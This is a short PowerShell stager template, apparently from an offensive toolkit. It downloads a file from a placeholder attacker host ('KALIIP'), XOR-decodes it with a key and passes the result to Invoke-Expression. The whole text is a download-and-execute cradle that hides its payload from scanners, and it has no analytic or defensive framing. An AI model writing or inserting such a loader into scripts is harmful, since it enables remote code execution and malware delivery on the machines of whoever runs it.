$KEY0 = 'KEY';
$KEY = (New-Object System.Net.WebClient).DownloadData('http://KALIIP/Verified/obf/OUTFILE');
for ($i = 0; $i -lt $KEY.Length; $i++) { $KEY[$i] = $KEY[$i] -bxor $KEY0[$i % $KEY0.Length]; };
[System.Text.Encoding]::UTF8.GetString($KEY) | IEX